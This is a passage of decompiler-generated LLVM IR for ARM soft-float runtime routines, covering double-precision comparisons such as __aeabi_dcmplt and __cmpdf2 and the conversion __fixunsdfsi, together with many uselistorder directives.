  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 5, 6, 8, 7, 10, 9, 13, 11, 14, 12, 113, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 99, 97, 100, 98, 103, 101, 104, 102, 106, 105, 108, 107, 110, 109, 112, 111 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 184, 13, 14, 183, 187, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 181, 110, 111, 112, 113, 182, 188, 114, 115, 189, 116, 190, 117, 191, 118, 119, 120, 121, 122, 123, 124, 186, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 185, 1, 137, 138, 139, 140, 141, 142, 143, 144, 180, 146, 192, 145, 148, 193, 147, 179, 149, 151, 150, 152, 153, 154, 157, 155, 156, 158, 159, 160, 162, 161, 163, 164, 165, 168, 166, 167, 169, 170, 172, 171, 173, 174, 175, 176, 177, 178 }
  uselistorder i32 1048576, { 21, 0, 1, 2, 22, 23, 14, 3, 4, 5, 24, 6, 7, 25, 26, 15, 16, 8, 9, 27, 28, 29, 20, 30, 10, 17, 11, 19, 12, 31, 18, 32, 13 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 17, 58, 59, 60, 61, 62, 63, 64, 65, 66, 3, 67, 68, 18, 69, 70, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 119, 120, 121, 122, 131, 132, 133, 134, 144, 145, 146, 147, 148, 149, 150, 151, 5, 4, 22, 23, 24, 25, 26, 27, 152, 153, 6, 154, 155, 156, 157, 158, 159, 160, 123, 124, 125, 126, 127, 128, 129, 130, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 71, 7, 72, 73, 135, 8, 136, 137, 175, 176, 177, 178, 9, 179, 180, 181, 182, 183, 184, 185, 138, 139, 10, 140, 141, 142, 143, 117, 118, 74, 75, 76, 77, 11, 12, 78, 79, 80, 81, 82, 83, 84, 85, 28, 29, 30, 31, 32, 33, 34, 35, 235, 236, 19, 20, 36, 37, 38, 51, 52, 53, 54, 39, 40, 224, 225, 226, 227, 228, 229, 230, 231, 232, 13, 233, 234, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 186, 187, 188, 189, 190, 191, 192, 193, 194, 14, 16, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 2, 210, 211, 15, 21, 195, 1, 196, 197, 212, 0, 47, 48, 49, 50, 41, 42, 43, 44, 45, 46, 55, 56, 57 }
  uselistorder i32* @r5, { 114, 115, 116, 34, 117, 118, 119, 120, 121, 122, 123, 124, 50, 51, 52, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 35, 143, 144, 145, 146, 147, 148, 180, 185, 186, 36, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 0, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 223, 224, 225, 226, 227, 228, 245, 246, 247, 267, 268, 269, 270, 271, 272, 9, 273, 274, 275, 276, 278, 277, 29, 279, 280, 281, 282, 283, 53, 54, 55, 56, 57, 284, 285, 286, 287, 288, 289, 294, 295, 290, 291, 292, 293, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 10, 307, 308, 58, 59, 60, 61, 62, 63, 64, 65, 229, 230, 231, 11, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 181, 182, 183, 184, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 149, 150, 151, 152, 153, 154, 155, 156, 157, 424, 425, 426, 427, 428, 429, 436, 158, 32, 159, 4, 160, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 248, 249, 250, 251, 254, 255, 256, 257, 252, 253, 258, 12, 259, 260, 161, 162, 163, 164, 321, 1, 322, 323, 324, 325, 326, 327, 261, 262, 263, 264, 13, 265, 266, 215, 216, 217, 218, 219, 220, 14, 221, 222, 165, 17, 166, 167, 15, 168, 169, 170, 171, 172, 173, 16, 174, 175, 176, 177, 178, 179, 66, 18, 67, 68, 69, 70, 33, 71, 19, 72, 73, 74, 75, 76, 449, 20, 450, 451, 452, 466, 453, 455, 456, 457, 37, 44, 21, 45, 22, 46, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 396, 400, 401, 402, 403, 404, 405, 397, 398, 399, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 8, 417, 418, 419, 2, 420, 421, 422, 423, 100, 101, 102, 103, 104, 382, 383, 384, 385, 386, 387, 23, 388, 389, 5, 458, 24, 459, 460, 461, 328, 25, 329, 6, 430, 431, 432, 433, 434, 435, 390, 391, 392, 393, 394, 395, 330, 30, 331, 332, 333, 334, 335, 336, 337, 339, 338, 340, 341, 342, 343, 344, 345, 346, 347, 26, 348, 349, 350, 351, 352, 353, 31, 354, 355, 356, 357, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 7, 375, 376, 377, 378, 379, 380, 47, 48, 49, 358, 359, 360, 3, 27, 381, 91, 90, 28, 462, 463, 464, 465, 105, 106, 107, 108, 109, 110, 454, 92, 93, 94, 95, 96, 97, 98, 99, 38, 39, 40, 41, 42, 43, 111, 112, 113 }
  uselistorder i32 %arg4, { 3, 2, 9, 8, 7, 6, 5, 0, 1, 4, 10 }
  uselistorder i32 %arg3, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_1ef30, { 1, 0 }
  uselistorder label %dec_label_pc_1ef14, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_1eee0, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1edd8, { 1, 0 }
  uselistorder label %dec_label_pc_1edc0, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1ef54 = call i32 @function_1ef64()
  ret i32 %v0_1ef54
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1ef5c = call i32 @function_1ef64()
  ret i32 %v0_1ef5c

; uselistorder directives
  uselistorder i32 ()* @function_1ef64, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1ef60 = load i32, i32* @r0, align 4
  ret i32 %v0_1ef60
}

define i32 @function_1ef64() local_unnamed_addr {
dec_label_pc_1ef64:
  %v0_1ef64 = load i32, i32* @ip, align 4
  %v0_1ef68 = load i32, i32* @r0, align 4
  %v2_1ef68 = mul i32 %v0_1ef68, 2
  %v2_1ef68.off = add i32 %v2_1ef68, 4194303
  %tmp = icmp ult i32 %v2_1ef68.off, 2097152
  %v0_1ef70 = load i32, i32* @r2, align 4
  %v2_1ef70 = mul i32 %v0_1ef70, 2
  br i1 %tmp, label %dec_label_pc_1efc0, label %bb

bb:                                               ; preds = %dec_label_pc_1ef64
  %v2_1ef70.off = add i32 %v2_1ef70, 4194303
  %tmp26 = icmp ult i32 %v2_1ef70.off, 2097152
  br i1 %tmp26, label %dec_label_pc_1efb4, label %dec_label_pc_1ef7c

dec_label_pc_1ef7c:                               ; preds = %dec_label_pc_1efc8, %dec_label_pc_1efd4, %bb
  %v0_1ef7c = load i32, i32* @r1, align 4
  %v4_1ef7c = or i32 %v0_1ef7c, %v2_1ef68
  %v6_1ef7c = icmp eq i32 %v4_1ef7c, 0
  br i1 %v6_1ef7c, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_1ef7c
  %v1_1ef80 = load i32, i32* @r3, align 4
  %v5_1ef80 = or i32 %v1_1ef80, %v2_1ef70
  %v7_1ef80 = icmp eq i32 %v5_1ef80, 0
  br i1 %v7_1ef80, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1ef7c, %bb14
  %v3_1ef84 = xor i32 %v0_1ef70, %v0_1ef68
  %v5_1ef84 = icmp eq i32 %v3_1ef84, 0
  br i1 %v5_1ef84, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1ef88.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_1ef88 = phi i32 [ %v2_1ef88.pre, %.thread..thread1_crit_edge ], [ %v1_1ef80, %bb14 ]
  %v5_1ef88 = icmp eq i32 %v2_1ef88, %v0_1ef7c
  br i1 %v5_1ef88, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_1ef70, %v0_1ef68
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_1ef98.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_1ef84, %.thread ]
  %v3_1ef98 = icmp slt i32 %v2_1ef98.pre-phi, 0
  br i1 %v3_1ef98, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_1ef9c = icmp eq i32 %v0_1ef68, %v0_1ef70
  br i1 %v10_1ef9c, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_1efa0 = load i32, i32* @r3, align 4
  %v4_1efa0 = icmp ult i32 %v0_1ef7c, %v2_1efa0
  br i1 %v4_1efa0, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_1ef9c = icmp ult i32 %v0_1ef68, %v0_1ef70
  br i1 %v4_1ef9c, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_1ef70, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_1efa4 = and i32 %v0_1ef70, 1073741824
  %v3_1efa4 = icmp eq i32 %v2_1efa4, 0
  %v4_1efa4 = ashr i32 %v0_1ef70, 31
  br i1 %v3_1efa4, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_1efa8.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_1efa4, %bb19 ]
  %v5_1efa8 = sub nsw i32 -1, %v4_1efa8.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_1efac = phi i32 [ %v4_1efa4, %bb19 ], [ %v5_1efa8, %.thread7 ]
  %v1_1efac = or i32 %v0_1efac, 1
  ret i32 %v1_1efac

dec_label_pc_1efb4:                               ; preds = %bb
  br label %dec_label_pc_1efc8

dec_label_pc_1efc0:                               ; preds = %dec_label_pc_1ef64
  %v0_1efc0 = load i32, i32* @r1, align 4
  %v4_1efc0 = mul i32 %v0_1ef68, 4096
  %v5_1efc0 = or i32 %v0_1efc0, %v4_1efc0
  %v7_1efc0 = icmp eq i32 %v5_1efc0, 0
  br i1 %v7_1efc0, label %dec_label_pc_1efc0.dec_label_pc_1efc8_crit_edge, label %dec_label_pc_1efdc

dec_label_pc_1efc0.dec_label_pc_1efc8_crit_edge:  ; preds = %dec_label_pc_1efc0
  %v2_1ef70.off25 = add i32 %v2_1ef70, 4194303
  %tmp27 = icmp ult i32 %v2_1ef70.off25, 2097152
  br label %dec_label_pc_1efc8

dec_label_pc_1efc8:                               ; preds = %dec_label_pc_1efc0.dec_label_pc_1efc8_crit_edge, %dec_label_pc_1efb4
  %v3_1efcc.pre-phi = phi i1 [ %tmp27, %dec_label_pc_1efc0.dec_label_pc_1efc8_crit_edge ], [ true, %dec_label_pc_1efb4 ]
  br i1 %v3_1efcc.pre-phi, label %dec_label_pc_1efd4, label %dec_label_pc_1ef7c

dec_label_pc_1efd4:                               ; preds = %dec_label_pc_1efc8
  %v0_1efd4 = load i32, i32* @r3, align 4
  %v4_1efd4 = mul i32 %v0_1ef70, 4096
  %v5_1efd4 = or i32 %v0_1efd4, %v4_1efd4
  %v7_1efd4 = icmp eq i32 %v5_1efd4, 0
  br i1 %v7_1efd4, label %dec_label_pc_1ef7c, label %dec_label_pc_1efdc

dec_label_pc_1efdc:                               ; preds = %dec_label_pc_1efc0, %dec_label_pc_1efd4
  ret i32 %v0_1ef64

; uselistorder directives
  uselistorder i32 %v4_1efa4, { 1, 0 }
  uselistorder i32 %v1_1ef80, { 1, 0 }
  uselistorder i32 %v0_1ef7c, { 2, 0, 1 }
  uselistorder i32 %v2_1ef70, { 0, 2, 1 }
  uselistorder i32 %v0_1ef70, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_1ef68, { 1, 0 }
  uselistorder i32 %v0_1ef68, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 31, { 13, 4, 2, 5, 7, 14, 3, 15, 16, 17, 18, 9, 10, 8, 1, 19, 0, 20, 21, 22, 23, 11, 6, 12 }
  uselistorder i32* @r3, { 26, 27, 2, 28, 29, 30, 0, 31, 6, 32, 33, 34, 35, 44, 45, 13, 46, 53, 54, 3, 55, 56, 57, 4, 58, 59, 60, 5, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 38, 39, 40, 41, 42, 43, 47, 48, 49, 50, 12, 92, 93, 1, 36, 37, 20, 21, 19, 89, 90, 91, 86, 87, 88, 14, 15, 16, 17, 18, 8, 9, 10, 11, 22, 23, 24, 25, 7, 51, 52 }
  uselistorder i32* @r1, { 109, 110, 12, 111, 112, 113, 114, 115, 116, 13, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 28, 14, 29, 30, 128, 0, 2, 129, 11, 130, 131, 132, 133, 10, 134, 135, 136, 137, 138, 139, 146, 15, 16, 147, 148, 149, 150, 151, 152, 161, 162, 163, 164, 165, 170, 192, 193, 194, 195, 196, 197, 198, 199, 200, 7, 31, 32, 201, 202, 171, 172, 203, 204, 205, 206, 33, 37, 166, 167, 168, 3, 169, 143, 144, 207, 208, 214, 215, 140, 86, 173, 184, 178, 179, 180, 181, 182, 183, 174, 175, 176, 177, 185, 141, 142, 216, 217, 218, 219, 220, 221, 222, 223, 224, 186, 187, 188, 189, 191, 236, 153, 154, 155, 156, 157, 158, 18, 145, 1, 34, 35, 36, 38, 39, 40, 23, 19, 25, 26, 247, 27, 252, 253, 159, 160, 103, 104, 41, 42, 43, 44, 107, 108, 248, 249, 250, 4, 251, 246, 100, 20, 237, 238, 240, 239, 254, 255, 225, 226, 227, 21, 209, 210, 211, 212, 213, 5, 242, 243, 8, 17, 6, 228, 229, 9, 230, 231, 232, 233, 22, 234, 235, 190, 101, 102, 24, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 105, 106, 241, 244, 245 }
  uselistorder i32* @ip, { 13, 14, 15, 10, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 56, 57, 58, 59, 60, 61, 62, 63, 65, 66, 64, 67, 1, 68, 2, 69, 70, 71, 72, 50, 51, 52, 53, 26, 27, 28, 73, 74, 75, 89, 11, 24, 25, 7, 12, 3, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 90, 91, 92, 93, 94, 95, 96, 97, 98, 54, 101, 102, 103, 104, 105, 106, 4, 107, 108, 109, 110, 111, 112, 113, 5, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 8, 125, 126, 127, 128, 129, 130, 131, 132, 133, 99, 6, 100, 177, 178, 9, 134, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 182, 179, 180, 181, 0, 183 }
  uselistorder label %dec_label_pc_1efdc, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1ef7c, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1efe4 = load i32, i32* @r0, align 4
  %v0_1efe8 = load i32, i32* @r2, align 4
  store i32 %v0_1efe8, i32* @r0, align 4
  store i32 %v0_1efe4, i32* @r2, align 4
  %v0_1effc = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1effc
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1f000 = load i32, i32* @r0, align 4
  %v1_1f004 = sext i32 %v3_1f000 to i64
  %v2_1f004 = bitcast i64 %v1_1f004 to double
  %v3_1f004 = load i32, i32* @r2, align 4
  %v4_1f004 = sext i32 %v3_1f004 to i64
  %v5_1f004 = bitcast i64 %v4_1f004 to double
  %v7_1f004 = fcmp oeq double %v2_1f004, %v5_1f004
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1f004 = fcmp ule double %v2_1f004, %v5_1f004
  %not.v7_1f004 = xor i1 %v7_1f004, true
  %v1_1f008 = and i1 %not.v6_1f004, %not.v7_1f004
  store i1 %v7_1f004, i1* @cpsr_z, align 1
  br i1 %v1_1f008, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1f004, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1f000

; uselistorder directives
  uselistorder i1 %v7_1f004, { 1, 2, 0 }
  uselistorder i32* @r2, { 19, 31, 32, 90, 91, 92, 13, 93, 94, 95, 96, 97, 98, 99, 105, 23, 15, 107, 108, 109, 110, 111, 120, 140, 141, 142, 143, 144, 145, 146, 33, 147, 148, 149, 122, 16, 150, 151, 36, 106, 34, 35, 117, 118, 6, 119, 103, 104, 152, 153, 154, 17, 57, 14, 218, 219, 220, 221, 125, 126, 127, 123, 124, 128, 100, 155, 156, 2, 157, 158, 159, 129, 130, 131, 132, 133, 134, 135, 136, 138, 3, 173, 139, 112, 113, 114, 101, 102, 37, 38, 20, 222, 183, 7, 184, 228, 229, 230, 5, 4, 224, 30, 181, 223, 115, 116, 79, 39, 40, 87, 225, 187, 188, 189, 8, 190, 191, 192, 9, 185, 186, 193, 194, 195, 196, 197, 10, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 209, 208, 11, 210, 211, 212, 213, 214, 18, 231, 160, 161, 162, 58, 66, 121, 232, 239, 240, 233, 234, 235, 236, 237, 238, 0, 1, 241, 12, 242, 163, 164, 165, 167, 166, 168, 169, 170, 171, 172, 24, 137, 76, 77, 72, 21, 22, 226, 227, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 61, 62, 63, 64, 65, 67, 68, 69, 70, 71, 73, 74, 75, 78, 25, 26, 27, 28, 29, 80, 81, 82, 83, 84, 85, 86, 88, 89, 174, 175, 176, 177, 178, 179, 180, 182, 215, 216, 217 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq() local_unnamed_addr {
entry:
  %v0_1f014 = load i32, i32* @lr, align 4
  %v0_1f018 = call i32 @__aeabi_cdcmple()
  %v0_1f01c = load i1, i1* @cpsr_z, align 1
  %.v0_1f018. = zext i1 %v0_1f01c to i32
  call void @__pseudo_branch(i32 %v0_1f014)
  ret i32 %.v0_1f018.
}

define i32 @__aeabi_dcmplt() local_unnamed_addr {
entry:
  %v0_1f028 = load i32, i32* @lr, align 4
  %v0_1f02c = call i32 @__aeabi_cdcmple()
  %v0_1f030 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1f030 to i32
  %.v0_1f02c. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1f028)
  ret i32 %.v0_1f02c.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1f03c = load i32, i32* @lr, align 4
  store i32 %v0_1f03c, i32* %stack_var_-8, align 4
  %v0_1f040 = call i32 @__aeabi_cdcmple()
  %v0_1f044 = load i1, i1* @cpsr_z, align 1
  %v1_1f044 = load i1, i1* @cpsr_c, align 1
  %v2_1f044 = xor i1 %v1_1f044, true
  %v3_1f044 = or i1 %v0_1f044, %v2_1f044
  %.v0_1f040 = select i1 %v3_1f044, i32 1, i32 %v0_1f040
  %v2_1f048 = xor i1 %v0_1f044, true
  %v3_1f048 = and i1 %v1_1f044, %v2_1f048
  %..v0_1f040 = select i1 %v3_1f048, i32 0, i32 %.v0_1f040
  %v2_1f04c = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1f04c)
  ret i32 %..v0_1f040

; uselistorder directives
  uselistorder i1 %v1_1f044, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1f050 = load i32, i32* @lr, align 4
  store i32 %v0_1f050, i32* %stack_var_-8, align 4
  %v0_1f054 = call i32 @__aeabi_cdrcmple()
  %v0_1f058 = load i1, i1* @cpsr_z, align 1
  %v1_1f058 = load i1, i1* @cpsr_c, align 1
  %v2_1f058 = xor i1 %v1_1f058, true
  %v3_1f058 = or i1 %v0_1f058, %v2_1f058
  %.v0_1f054 = select i1 %v3_1f058, i32 1, i32 %v0_1f054
  %v2_1f05c = xor i1 %v0_1f058, true
  %v3_1f05c = and i1 %v1_1f058, %v2_1f05c
  %..v0_1f054 = select i1 %v3_1f05c, i32 0, i32 %.v0_1f054
  %v2_1f060 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_1f060)
  ret i32 %..v0_1f054

; uselistorder directives
  uselistorder i1 %v1_1f058, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 90, 1, 6, 7, 8, 9, 76, 77, 83, 78, 79, 80, 84, 10, 11, 12, 13, 15, 14, 92, 93, 94, 95, 96, 97, 98, 81, 99, 100, 101, 86, 102, 103, 104, 105, 82, 106, 107, 108, 109, 110, 111, 112, 16, 113, 91, 114, 17, 18, 19, 20, 21, 22, 85, 115, 23, 24, 87, 27, 28, 29, 30, 25, 26, 88, 31, 32, 33, 34, 89, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 57, 58, 63, 64, 61, 62, 74, 65, 66, 67, 68, 75, 69, 70, 71, 72, 73 }
  uselistorder i1* @cpsr_z, { 11, 12, 13, 14, 15, 22, 23, 24, 25, 26, 27, 0, 1, 2, 16, 17, 18, 19, 20, 21, 35, 36, 37, 38, 39, 40, 41, 3, 4, 28, 29, 42, 5, 6, 7, 31, 32, 33, 34, 8, 30, 9, 10 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1f064 = load i32, i32* @lr, align 4
  %v0_1f068 = call i32 @__aeabi_cdrcmple()
  %v0_1f06c = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1f06c to i32
  %.v0_1f068. = xor i32 %tmp2, 1
  call void @__pseudo_branch(i32 %v0_1f064)
  ret i32 %.v0_1f068.

; uselistorder directives
  uselistorder i1 false, { 26, 9, 10, 39, 40, 41, 42, 43, 44, 45, 46, 47, 8, 27, 22, 28, 29, 30, 31, 32, 3, 11, 12, 23, 1, 20, 48, 0, 33, 14, 34, 35, 36, 13, 37, 38, 21, 2, 5, 24, 25, 49, 17, 16, 15, 18, 6, 7, 19, 4, 50, 51, 52, 53 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
  uselistorder i32* @lr, { 11, 12, 13, 14, 15, 8, 27, 28, 29, 30, 31, 32, 33, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 55, 9, 60, 61, 62, 63, 16, 64, 65, 66, 67, 68, 69, 70, 71, 1, 72, 73, 74, 75, 53, 54, 40, 114, 115, 36, 37, 38, 80, 79, 0, 20, 81, 82, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 3, 135, 136, 137, 4, 138, 139, 140, 5, 141, 142, 143, 144, 145, 146, 147, 148, 56, 57, 58, 39, 83, 85, 87, 59, 6, 88, 89, 7, 90, 91, 34, 35, 17, 10, 116, 117, 118, 24, 149, 26, 150, 151, 152, 119, 120, 121, 124, 76, 77, 78, 92, 93, 112, 113, 94, 95, 96, 97, 98, 99, 2, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 86, 18, 19, 84, 122, 123, 21, 22, 23, 25 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1f078 = icmp slt i32 %arg1, 0
  %v2_1f078 = mul i32 %arg1, 2
  br i1 %v1_1f078, label %dec_label_pc_1f0ac, label %dec_label_pc_1f080

dec_label_pc_1f080:                               ; preds = %entry
  %v1_1f080 = add i32 %v2_1f078, 2097152
  %v2_1f080 = icmp ugt i32 %v2_1f078, -2097153
  br i1 %v2_1f080, label %dec_label_pc_1f0b4, label %dec_label_pc_1f088

dec_label_pc_1f088:                               ; preds = %dec_label_pc_1f080
  %v6_1f080 = icmp slt i32 %v1_1f080, 0
  br i1 %v6_1f080, label %dec_label_pc_1f08c, label %dec_label_pc_1f0ac

dec_label_pc_1f08c:                               ; preds = %dec_label_pc_1f088
  %v4_1f090 = sdiv i32 %v1_1f080, 2097152
  %v5_1f090 = sub nsw i32 -993, %v4_1f090
  %v11_1f090 = icmp slt i32 %v5_1f090, 0
  br i1 %v11_1f090, label %dec_label_pc_1f0bc, label %dec_label_pc_1f098

dec_label_pc_1f098:                               ; preds = %dec_label_pc_1f08c
  %v3_1f098 = mul i32 %arg1, 2048
  %v4_1f0a0 = udiv i32 %arg2, 2097152
  %v1_1f09c = or i32 %v3_1f098, %v4_1f0a0
  %v5_1f0a0 = or i32 %v1_1f09c, -2147483648
  %v6_1f0a4 = lshr i32 %v5_1f0a0, %v5_1f090
  ret i32 %v6_1f0a4

dec_label_pc_1f0ac:                               ; preds = %dec_label_pc_1f088, %entry
  ret i32 0

dec_label_pc_1f0b4:                               ; preds = %dec_label_pc_1f080
  %v4_1f0b4 = mul i32 %arg1, 4096
  %v5_1f0b4 = or i32 %v4_1f0b4, %arg2
  %v7_1f0b4 = icmp eq i32 %v5_1f0b4, 0
  br i1 %v7_1f0b4, label %dec_label_pc_1f0bc, label %dec_label_pc_1f0c4

dec_label_pc_1f0bc:                               ; preds = %dec_label_pc_1f0b4, %dec_label_pc_1f08c
  ret i32 -1

dec_label_pc_1f0c4:                               ; preds = %dec_label_pc_1f0b4
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 2, 3, 4, 5, 6, 24, 7, 8, 25, 9, 10, 11, 12, 26, 30, 18, 31, 29, 16, 13, 0, 1, 17, 14, 19, 20, 27, 28, 21, 32, 22, 33, 15, 23 }
  uselistorder i32 -2147483648, { 0, 9, 1, 10, 11, 12, 13, 14, 15, 17, 16, 3, 7, 8, 18, 19, 20, 21, 6, 4, 5, 2, 22, 23, 24, 25 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 10, 11, 9, 12, 17, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
